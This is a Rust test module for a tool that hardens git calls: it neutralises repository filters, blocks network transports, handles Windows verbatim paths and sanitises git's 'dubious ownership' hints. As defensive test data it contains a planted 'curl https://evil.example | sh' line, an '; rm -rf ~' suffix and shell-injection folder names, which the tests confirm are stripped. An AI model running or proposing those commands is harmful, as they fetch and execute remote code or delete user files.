        let config = parse_repo_config(b"local\0filter.ok.clean\n\xff\0");
        assert!(!config.non_utf8_filter);
    }

    #[test]
    fn repo_config_detects_a_partial_clone() {
        let config = parse_repo_config(b"local\0remote.origin.promisor\ntrue\0");
        assert!(config.partial_clone);
        let config = parse_repo_config(b"local\0extensions.partialclone\norigin\0");
        assert!(config.partial_clone);
        // Any value counts, failing safe: the cost is only hidden line counts.
        let config = parse_repo_config(b"local\0remote.origin.promisor\nfalse\0");
        assert!(config.partial_clone);
        // A key with no value is printed with no line feed after it.
        let config = parse_repo_config(b"local\0remote.origin.promisor\0");
        assert!(config.partial_clone);
        let config = parse_repo_config(b"global\0remote.origin.promisor\ntrue\0");
        assert!(!config.partial_clone);
    }

    #[test]
    fn a_verbatim_path_becomes_plain_when_it_names_the_same_folder() {
        assert_eq!(
            plain_windows_path(r"\\?\UNC\wsl.localhost\Ubuntu-24.04\home\me\nra.all").as_deref(),
            Some(r"\\wsl.localhost\Ubuntu-24.04\home\me\nra.all")
        );
        assert_eq!(plain_windows_path(r"\\?\C:\work\app").as_deref(), Some(r"C:\work\app"));
        assert_eq!(plain_windows_path(r"\\?\C:\work\app\").as_deref(), Some(r"C:\work\app"));
        assert_eq!(plain_windows_path(r"\\?\C:\").as_deref(), Some(r"C:\"));
        assert_eq!(plain_windows_path(r"\\?\UNC\server\share").as_deref(), Some(r"\\server\share"));
        assert_eq!(plain_windows_path(r"\\?\UNC\wsl$\Ubuntu\x").as_deref(), Some(r"\\wsl$\Ubuntu\x"));
    }

    #[test]
    fn a_verbatim_path_keeps_its_prefix_when_the_plain_form_differs() {
        for path in [
            r"\\?\C:",                         // would mean drive C's current folder
            r"\\?\C:\work\trailing.",          // Windows drops a trailing dot
            r"\\?\C:\work\trailing ",          // and a trailing space
            r"\\?\C:\work\nul",                // a device name
            r"\\?\C:\work\COM1.txt",           // with an extension too
            r"\\?\C:\work\a/b",                // `/` is a separator in a plain path
            r"\\?\C:\work\..\x",               // `..` would be resolved
            r"\\?\C:\work\file:stream",        // `:` names a data stream
            r"\\?\C:\work\\double",            // an empty part
            r"\\?\UNC\server",                 // no share
            r"\\?\UNC\\share\x",               // no server
            r"\\?\Volume{0000}\x",             // a volume GUID has no plain form
            r"\\?\GLOBALROOT\Device\x",
            r"C:\already\plain",
            "/unix/path",
        ] {
            assert_eq!(plain_windows_path(path), None, "{path}");
        }
        // A folder path over 247 UTF-16 units needs the prefix.
        let fits = format!(r"\\?\C:\{}", "a".repeat(244));
        assert_eq!(plain_windows_path(&fits).map(|p| p.len()), Some(247));
        let long = format!(r"\\?\C:\{}", "a".repeat(245));
        assert_eq!(plain_windows_path(&long), None);
        // A character outside the BMP takes two units.
        let emoji = format!(r"\\?\C:\{}\u{{1F600}}", "a".repeat(242));
        assert_eq!(plain_windows_path(&emoji), None);
    }

    #[test]
    fn device_names_are_matched_without_case_or_extension() {
        for name in ["CON", "con", "Nul.txt", "COM9", "lpt1.log", "COM¹", "AUX "] {
            assert!(is_reserved_device_name(name), "{name}");
        }
        for name in ["CONSOLE", "COM10", "COM", "nulls", "lpt"] {
            assert!(!is_reserved_device_name(name), "{name}");
        }
    }

    #[cfg(not(windows))]
    #[test]
    fn git_sees_the_folder_unchanged_outside_windows() {
        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
        let dir = Path::new(r"/srv/\\?\UNC\odd");
        let command = probe_command(&git, dir).unwrap();
        assert_eq!(command.get_current_dir(), Some(dir));
        let command = git_command(&git, dir, &RepoConfig::default()).unwrap();
        assert!(command.get_args().any(|a| a == dir.as_os_str()));
    }

    const WSL_REFUSAL: &str = "fatal: detected dubious ownership in repository at \
        '//wsl.localhost/Ubuntu-24.04/home/me/app'\n\
        'C:/Users/me' is owned by:\n\
        \tBUILTIN/Administrators (S-1-5-32-544)\n\
        To add an exception for this directory, call:\n\
        \n\
        \tgit config --global --add safe.directory \
        '%(prefix)///wsl.localhost/Ubuntu-24.04/home/me/app'\n";

    fn last_line(message: &str) -> &str {
        message.lines().last().unwrap()
    }

    #[test]
    fn dubious_ownership_gives_gits_own_command() {
        // git for Windows, as reported from a WSL folder. On Windows the
        // project folder is the verbatim form of the same path.
        let dir = if cfg!(windows) {
            r"\\?\UNC\wsl.localhost\Ubuntu-24.04\home\me\app"
        } else {
            "//wsl.localhost/Ubuntu-24.04/home/me/app"
        };
        let message = unsafe_ownership_message(WSL_REFUSAL, Path::new(dir)).unwrap();
        assert_eq!(
            last_line(&message),
            "git config --global --add safe.directory '%(prefix)///wsl.localhost/Ubuntu-24.04/home/me/app'"
        );
        assert!(
            message.starts_with("Git will not read the repository at //wsl.localhost/Ubuntu-24.04/home/me/app,"),
            "{message}"
        );

        // git 2.35.2 worded it differently, and 2.36 to 2.3x leave a bare
        // path unquoted.
        let old = "fatal: unsafe repository ('/srv/app' is owned by someone else)\n\
                   To add an exception for this directory, call:\n\n\
                   \tgit config --global --add safe.directory /srv/app\n";
        let message = unsafe_ownership_message(old, Path::new("/srv/app/")).unwrap();
        assert_eq!(last_line(&message), "git config --global --add safe.directory /srv/app");
    }

    #[test]
    fn dubious_ownership_without_a_usable_hint_has_no_command() {
        let dir = Path::new("/srv/app");
        // No hint at all.
        let bare = unsafe_ownership_message("fatal: detected dubious ownership in repository at '/srv/app'", dir)
            .unwrap();
        assert!(!bare.contains('\n'), "{bare}");
        assert!(bare.contains("/srv/app") && bare.contains("safe.directory"), "{bare}");
        // A hint for another path, or a bare path with a space.
        for hint in [
            "git config --global --add safe.directory /srv/other",
            "git config --global --add safe.directory '*'",
            "git config --global --add safe.directory /srv/app; rm -rf ~",
        ] {
            let stderr = format!(
                "fatal: detected dubious ownership in repository at '/srv/app'\n\
                 To add an exception for this directory, call:\n\n\t{hint}\n"
            );
            let message = unsafe_ownership_message(&stderr, dir).unwrap();
            assert!(!message.contains('\n'), "{hint}: {message}");
        }
        let spaced = "fatal: detected dubious ownership in repository at '/srv/my app'\n\
                      To add an exception for this directory, call:\n\n\
                      \tgit config --global --add safe.directory /srv/my app\n";
        let message = unsafe_ownership_message(spaced, Path::new("/srv/my app")).unwrap();
        assert!(!message.contains('\n'), "{message}");
        // Quoted, the same path is offered.
        let quoted = spaced.replace("safe.directory /srv/my app", "safe.directory '/srv/my app'");
        let message = unsafe_ownership_message(&quoted, Path::new("/srv/my app")).unwrap();
        assert_eq!(last_line(&message), "git config --global --add safe.directory '/srv/my app'");
    }

    #[test]
    fn a_folder_name_cannot_inject_a_command() {
        // A folder named with a line break, as git prints it, plants a line
        // that looks like git's hint before the real one.
        let stderr = "fatal: detected dubious ownership in repository at '/srv/inj\n\
                      git config --global --add safe.directory x; curl https://evil.example | sh\n\
                      z'\n\
                      To add an exception for this directory, call:\n\n\
                      \tgit config --global --add safe.directory '/srv/inj\n\
                      git config --global --add safe.directory x; curl https://evil.example | sh\n\
                      z'\n";
        let message = unsafe_ownership_message(stderr, Path::new("/srv/inj")).unwrap();
        assert!(!message.contains('\n'), "{message}");
        assert!(!message.contains("evil"), "{message}");

        // Shell syntax in a name, quoted the way git quotes it.
        for name in ["x'\\'';calc;'\\''&y", "Q3 & calc", "a$(id)", "a%PATH%", "bidi\u{202E}txt", "café"] {
            let stderr = format!(
                "fatal: detected dubious ownership in repository at '/srv/{name}'\n\
                 To add an exception for this directory, call:\n\n\
                 \tgit config --global --add safe.directory '/srv/{name}'\n"
            );
            let dir = PathBuf::from(format!("/srv/{name}"));
            let message = unsafe_ownership_message(&stderr, &dir).unwrap();
            assert!(!message.contains('\n'), "{name}: {message}");
            assert!(!message.contains(name), "{name}: {message}");
        }
    }

    fn refusal_at(path: &str) -> String {
        format!(
            "fatal: detected dubious ownership in repository at '{path}'\n\
             To add an exception for this directory, call:\n\n\
             \tgit config --global --add safe.directory '{path}'\n"
        )
    }

    #[test]
    fn a_larger_repository_holding_the_project_gets_the_command() {
        let message =
            unsafe_ownership_message(&refusal_at("/srv/mono"), Path::new("/srv/mono/apps/web")).unwrap();
        assert!(message.contains("which holds the project folder"), "{message}");
        assert_eq!(last_line(&message), "git config --global --add safe.directory '/srv/mono'");
        // A name that only starts the same is not a parent.
        let message =
            unsafe_ownership_message(&refusal_at("/srv/mono"), Path::new("/srv/monorepo")).unwrap();
        assert!(message.contains("not the project folder"), "{message}");
        assert!(!message.contains('\n'), "{message}");
    }

    #[test]
    fn a_repository_at_a_root_gets_a_warning_not_a_command() {
        for (root, dir) in [
            ("C:/", "C:/Users/me/app"),
            ("/", "/srv/app"),
            ("//server/share", "//server/share/app"),
            ("//wsl.localhost/Ubuntu-24.04", "//wsl.localhost/Ubuntu-24.04/home/me/app"),
        ] {
            let message = unsafe_ownership_message(&refusal_at(root), Path::new(dir)).unwrap();
            assert!(!message.contains('\n'), "{root}: {message}");
            assert!(message.contains("not the project folder"), "{root}: {message}");
        }
    }

    #[test]
    fn roots_are_recognised() {
        for path in ["/", "C:", "C:/", "c:\\", "//server/share", "//server/share/", "//server"] {
            assert!(is_root_folder(path), "{path}");
        }
        for path in ["/srv", "C:/Users", "//server/share/dir", "relative"] {
            assert!(!is_root_folder(path), "{path}");
        }
    }

    #[test]
    fn only_gits_fatal_line_decides_the_error() {
        let dir = Path::new("/srv/unsafe repository");
        assert!(unsafe_ownership_message("fatal: not a git repository", dir).is_none());
        // The words in a path, or after another error, do not count.
        let stderr = "fatal: bad object HEAD in '/srv/detected dubious ownership'\n";
        assert!(unsafe_ownership_message(stderr, dir).is_none());
        let stderr = "warning: x\nfatal: unable to read tree\nfatal: detected dubious ownership in repository at '/x'\n";
        assert!(unsafe_ownership_message(stderr, dir).is_none());
    }

    #[cfg(windows)]
    #[test]
    fn a_long_verbatim_project_folder_matches_gits_path() {
        let long = "a".repeat(250);
        let dir = PathBuf::from(format!(r"\\?\C:\work\{long}"));
        assert_eq!(folder_relation(&format!("C:/work/{long}"), &dir), FolderRelation::Same);
        let dir = PathBuf::from(format!(r"\\?\UNC\server\share\{long}"));
        assert_eq!(folder_relation(&format!("//server/share/{long}"), &dir), FolderRelation::Same);
    }

    #[cfg(windows)]
    #[test]
    fn git_sees_the_plain_path_on_windows() {
        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
        let dir = Path::new(r"\\?\UNC\wsl.localhost\Ubuntu\home\me\app");
        let plain = Path::new(r"\\wsl.localhost\Ubuntu\home\me\app");
        assert_eq!(probe_command(&git, dir).unwrap().get_current_dir(), Some(plain));
        let command = git_command(&git, dir, &RepoConfig::default()).unwrap();
        assert!(command.get_args().any(|a| a == plain.as_os_str()));
    }

    #[test]
    fn every_call_blocks_all_transports() {
        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
        let command = git_command(&git, Path::new("."), &RepoConfig::default()).unwrap();
        let envs: Vec<_> = command.get_envs().collect();
        assert!(envs.contains(&(OsStr::new("GIT_ALLOW_PROTOCOL"), Some(OsStr::new("none")))));
        assert!(envs.contains(&(OsStr::new("GIT_NO_LAZY_FETCH"), Some(OsStr::new("1")))));
        // An exported `GIT_CONFIG` would hide the filters from every scope.
        assert!(envs.contains(&(OsStr::new("GIT_CONFIG"), None)));
        let args: Vec<_> = command.get_args().map(|a| a.to_string_lossy().into_owned()).collect();
        assert!(args.windows(2).any(|w| w == ["-c", "protocol.allow=never"]));
        assert!(args.windows(2).any(|w| w == ["-c", "core.sshCommand=false"]));
        // Before git 2.36, `false` here would be run as a hook program.
        assert!(args.windows(2).any(|w| w == ["-c", "core.fsmonitor="]));
    }

    #[test]
    fn every_builder_drops_inherited_command_line_config() {
        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
        let dir = Path::new(".");
        let config = RepoConfig::default();
        for command in [
            git_command(&git, dir, &config).unwrap(),
            isolated_git_command(&git, dir, &config).unwrap(),
            probe_command(&git, dir).unwrap(),
        ] {
            let envs: Vec<_> = command.get_envs().collect();
            assert!(envs.contains(&(OsStr::new("GIT_CONFIG_PARAMETERS"), None)), "{envs:?}");
        }
    }

    #[test]
    fn the_probe_leaves_out_options_old_git_lacks_and_keeps_the_hardening() {
        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 10) };
        let command = probe_command(&git, Path::new("/repo")).unwrap();
        let args: Vec<_> = command.get_args().map(|a| a.to_string_lossy().into_owned()).collect();
        assert!(!args.iter().any(|a| a == "--no-optional-locks"), "{args:?}");
        assert!(!args.iter().any(|a| a == "-C"), "{args:?}");
        assert_eq!(command.get_current_dir(), Some(Path::new("/repo")));
        assert!(args.windows(2).any(|w| w == ["-c", "protocol.allow=never"]));
        assert!(args.windows(2).any(|w| w == ["-c", "core.sshCommand=false"]));
        assert!(args.windows(2).any(|w| w == ["-c", "core.fsmonitor="]));
        let envs: Vec<_> = command.get_envs().collect();
        assert!(envs.contains(&(OsStr::new("GIT_ALLOW_PROTOCOL"), Some(OsStr::new("none")))));
        assert!(envs.contains(&(OsStr::new("GIT_CONFIG"), None)));
        assert!(envs.contains(&(OsStr::new("LC_ALL"), Some(OsStr::new("C")))));
    }

    #[cfg(unix)]
    #[test]
    fn shell_quote_escapes_single_quotes() {
        assert_eq!(shell_quote(Path::new("/a b/it's")), r"'/a b/it'\''s'");
    }

    #[test]
    fn inherited_config_entries_come_before_the_overrides() {
        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
        let config = parse_repo_config(b"local\0filter.evil.clean\nx\0");
        let command = build_command(&git, Path::new("."), &config, 3).unwrap();
        let env = |key: &str| {
            command
                .get_envs()
                .find(|(k, _)| *k == OsStr::new(key))
                .and_then(|(_, v)| v.map(|v| v.to_string_lossy().into_owned()))
        };
        assert_eq!(env("GIT_CONFIG_COUNT").as_deref(), Some("7"));
        assert_eq!(env("GIT_CONFIG_KEY_3").as_deref(), Some("filter.evil.clean"));
        assert_eq!(env("GIT_CONFIG_VALUE_3").as_deref(), Some(""));
        assert_eq!(env("GIT_CONFIG_KEY_6").as_deref(), Some("filter.evil.required"));
        assert_eq!(env("GIT_CONFIG_VALUE_6").as_deref(), Some("false"));
        assert_eq!(env("GIT_CONFIG_KEY_0"), None);
    }

    #[test]
    fn an_inherited_count_git_cannot_read_is_an_error() {
        assert_eq!(inherited_config_count(None), Ok(0));
        assert_eq!(inherited_config_count(Some(OsStr::new(""))), Ok(0));
        assert_eq!(inherited_config_count(Some(OsStr::new(" 3"))), Ok(3));
        assert!(inherited_config_count(Some(OsStr::new("three"))).is_err());
        assert!(inherited_config_count(Some(OsStr::new("99999999999999999999999"))).is_err());
    }

    #[test]
    fn a_count_past_what_git_reads_is_an_error() {
        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
        let filters = parse_repo_config(b"local\0filter.evil.clean\nx\0");
        let dir = Path::new(".");
        // Wrapping would put our entries where git does not read them.
        assert!(build_command(&git, dir, &filters, usize::MAX).is_err());
        assert!(build_command(&git, dir, &filters, MAX_CONFIG_ENTRIES - 3).is_err());
        assert!(build_command(&git, dir, &filters, MAX_CONFIG_ENTRIES - 4).is_ok());
        assert!(build_command(&git, dir, &RepoConfig::default(), MAX_CONFIG_ENTRIES).is_ok());
    }

    #[cfg(unix)]
    #[test]
    fn only_absolute_path_entries_are_searched_for_git() {
        use std::os::unix::fs::PermissionsExt;
        let executable_git = |dir: &Path| {
            let git = dir.join("git");
            std::fs::write(&git, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).unwrap();
            git
        };
        // A relative folder that does hold a `git`, from the test's working
        // folder, so skipping it is what the test sees.
        // `target` is git-ignored here, and may not exist when the build
        // output goes elsewhere.
        std::fs::create_dir_all("target").unwrap();
        let held = tempfile::Builder::new().prefix("find-in-").tempdir_in("target").unwrap();
        executable_git(held.path());
        let cwd = std::env::current_dir().unwrap();
        let relative = held.path().strip_prefix(&cwd).expect("under the working folder");
        assert!(relative.join("git").is_file());
        let absolute = tempfile::tempdir().unwrap();
        let real = executable_git(absolute.path());

        let rel = relative.display();
        let list = format!(":.:{rel}:bin:{}", absolute.path().display());
        assert_eq!(find_in(OsStr::new(&list), "git"), Some(real));
        let only_relative = format!(":.:{rel}:bin");
        assert_eq!(find_in(OsStr::new(&only_relative), "git"), None);
    }

    #[test]
    fn git_without_show_scope_is_refused() {
        let err = check_git_reads_repo_config(GitVersion(2, 25), "see its history").unwrap_err();
        assert!(err.contains("needs git 2.26 or later, and git 2.25 is installed"), "{err}");
        assert!(check_git_reads_repo_config(GitVersion(2, 26), "see its history").is_ok());
    }

    #[test]
    fn parses_git_versions() {
        assert_eq!(parse_git_version("git version 2.39.5 (Apple Git-154)\n"), Some(GitVersion(2, 39)));
        assert_eq!(parse_git_version("git version 2.45.1.windows.1"), Some(GitVersion(2, 45)));
        assert_eq!(parse_git_version("git version 3.0.0-rc1"), Some(GitVersion(3, 0)));
        assert_eq!(parse_git_version("not git"), None);
    }

    #[test]
    fn older_git_is_refused_only_when_a_protection_needs_it() {
        let plain = RepoConfig::default();
        let filters = RepoConfig { filters: vec!["evil".into()], ..RepoConfig::default() };
        let partial = RepoConfig { partial_clone: true, ..RepoConfig::default() };
        let non_utf8 = RepoConfig { non_utf8_filter: true, ..RepoConfig::default() };
        let purpose = "see its history";
        assert!(check_git_supports(&plain, GitVersion(2, 20), purpose).is_ok());
        assert!(check_git_supports(&filters, GitVersion(2, 30), purpose).is_err());
        assert!(check_git_supports(&filters, GitVersion(2, 31), purpose).is_ok());
        assert!(check_git_supports(&partial, GitVersion(2, 43), purpose).is_err());
        assert!(check_git_supports(&partial, GitVersion(2, 44), purpose).is_ok());
        let err = check_git_supports(&filters, GitVersion(2, 30), purpose).unwrap_err();
        assert!(err.ends_with("git 2.30 is installed. Update git to see its history."), "{err}");
        // No git version can blank a name it cannot be given.
        let err = check_git_supports(&non_utf8, GitVersion(2, 56), purpose).unwrap_err();
        assert!(err.contains("not valid UTF-8"), "{err}");
    }
}
